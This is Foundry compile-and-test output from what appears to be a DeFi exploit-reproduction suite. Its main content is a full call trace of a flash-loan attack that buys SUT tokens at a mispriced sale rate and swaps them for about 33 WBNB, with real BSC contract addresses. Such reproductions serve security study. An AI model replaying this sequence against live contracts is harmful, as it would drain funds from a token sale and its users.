Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.22s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/SUT_exp.sol:37:5:
   |
37 |     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 283.89ms (100.89µs CPU time)

Ran 1 test for src/test/2023-07/SUT_exp.sol:SUTTest
[PASS] testExploit() (gas: 283968)
Logs:
  Incorrect SUT token price returned from tokenPrice() function: 214224507283633242
  Buyed number of SUT tokens: 32.663166885742087138
  Attacker WBNB balance after exploit: 32.992919724107662747

Traces:
  [339768] SUTTest::testExploit()
    ├─ [0] VM::deal(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ [324760] DPPOracle::flashLoan(10000000000000000000 [1e19], 0, SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x00)
    │   ├─ [29962] WBNB::transfer(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
    │   │   ├─ emit Transfer(from: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], to: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10000000000000000000 [1e19])
    │   │   └─ ← [Return] true
    │   ├─ [265955] SUTTest::DPPFlashLoanCall(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19], 0, 0x00)
    │   │   ├─ [29423] SUT::approve(Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [9195] WBNB::withdraw(10000000000000000000 [1e19])
    │   │   │   ├─ [55] SUTTest::receive{value: 10000000000000000000}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [2495] SUTTokenSale::tokenPrice() [staticcall]
    │   │   │   └─ ← [Return] 214224507283633242 [2.142e17]
    │   │   ├─ emit log_named_uint(key: "Incorrect SUT token price returned from tokenPrice() function", val: 214224507283633242 [2.142e17])
    │   │   ├─ [2585] SUT::balanceOf(SUTTokenSale: [0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37]) [staticcall]
    │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19]
    │   │   ├─ [52485] SUTTokenSale::buyTokens{value: 6855184233076263744}(32663166885742087138 [3.266e19])
    │   │   │   ├─ [585] SUT::balanceOf(SUTTokenSale: [0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37]) [staticcall]
    │   │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19]
    │   │   │   ├─ [40357] SUT::transfer(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32663166885742087138 [3.266e19])
    │   │   │   │   ├─ emit Burn(: SUTTokenSale: [0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37], : 0)
    │   │   │   │   ├─ emit Transfer(from: SUTTokenSale: [0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37], to: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 32663166885742087138 [3.266e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ emit Sell(: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 32663166885742087138 [3.266e19])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [585] SUT::balanceOf(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19]
    │   │   ├─ emit log_named_decimal_uint(key: "Buyed number of SUT tokens", val: 32663166885742087138 [3.266e19], decimals: 18)
    │   │   ├─ [585] SUT::balanceOf(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19]
    │   │   ├─ [123757] Router::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x70E1bc7E53EAa96B74Fad1696C29459829509bE2, tokenOut: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, fee: 2500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, amountIn: 32663166885742087138 [3.266e19], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
    │   │   │   ├─ [1763] 0xdAecee3C08e953Bd5f89A5Cc90ac560413d709E3::getPool(0x41ff9AA7e16B8B1a8a8dc4f0eFacd93D02d071c9, SUT: [0x70E1bc7E53EAa96B74Fad1696C29459829509bE2], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 2500) [delegatecall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000ebc4b13f574ae8eb68e61b3b21f3457ab2f1f2e4
    │   │   │   ├─ [106989] 0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4::swap(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 32663166885742087138 [3.266e19], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b70e1bc7e53eaa96b74fad1696c29459829509be20009c4bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000)
    │   │   │   │   ├─ [27962] WBNB::transfer(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 39848103957183926491 [3.984e19])
    │   │   │   │   │   ├─ emit Transfer(from: 0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4, to: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 39848103957183926491 [3.984e19])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [2585] SUT::balanceOf(0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4) [staticcall]
    │   │   │   │   │   └─ ← [Return] 60444921076409531834 [6.044e19]
    │   │   │   │   ├─ [23437] Router::pancakeV3SwapCallback(32663166885742087138 [3.266e19], -39848103957183926491 [-3.984e19], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b70e1bc7e53eaa96b74fad1696c29459829509be20009c4bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [1983] 0xdAecee3C08e953Bd5f89A5Cc90ac560413d709E3::verifyCallback(0x41ff9AA7e16B8B1a8a8dc4f0eFacd93D02d071c9, SUT: [0x70E1bc7E53EAa96B74Fad1696C29459829509bE2], WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 2500) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000ebc4b13f574ae8eb68e61b3b21f3457ab2f1f2e4
    │   │   │   │   │   ├─ [17474] SUT::transferFrom(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4, 32663166885742087138 [3.266e19])
    │   │   │   │   │   │   ├─ emit Burn(: Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], : 0)
    │   │   │   │   │   │   ├─ emit Transfer(from: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4, value: 32663166885742087138 [3.266e19])
    │   │   │   │   │   │   ├─ emit Approval(owner: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], value: 115792089237316195423570985008687907853269984665640564039424920841027387552797 [1.157e77])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [585] SUT::balanceOf(0xEBc4B13F574AE8eb68E61B3B21F3457AB2f1F2e4) [staticcall]
    │   │   │   │   │   └─ ← [Return] 93108087962151618972 [9.31e19]
    │   │   │   │   ├─ emit Swap(param0: Router: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], param1: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 32663166885742087138 [3.266e19], param3: -39848103957183926491 [-3.984e19], param4: 82151339826559879215498212162 [8.215e28], param5: 279412876722495288565 [2.794e20], param6: 724, param7: 26130533508593669 [2.613e16], param8: 0)
    │   │   │   │   └─ ← [Return] 32663166885742087138 [3.266e19], -39848103957183926491 [-3.984e19]
    │   │   │   └─ ← [Return] 39848103957183926491 [3.984e19]
    │   │   ├─ [2074] WBNB::deposit{value: 3144815766923736256}()
    │   │   │   ├─ emit Deposit(dst: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 3144815766923736256 [3.144e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [3262] WBNB::transfer(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], 10000000000000000000 [1e19])
    │   │   │   ├─ emit Transfer(from: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681], value: 10000000000000000000 [1e19])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 3251547116720532072822 [3.251e21]
    │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 181175961505897923421151 [1.811e23]
    │   ├─ [534] WBNB::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 3251547116720532072822 [3.251e21]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(DPPOracle: [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]) [staticcall]
    │   │   └─ ← [Return] 181175961505897923421151 [1.811e23]
    │   ├─ emit DODOFlashLoan(: SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 10000000000000000000 [1e19], : 0)
    │   └─ ← [Stop] 
    ├─ [534] WBNB::balanceOf(SUTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 32992919724107662747 [3.299e19]
    ├─ [2444] WBNB::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance after exploit", val: 32992919724107662747 [3.299e19], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.03s (1.75s CPU time)

Ran 2 test suites in 2.29s (2.32s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
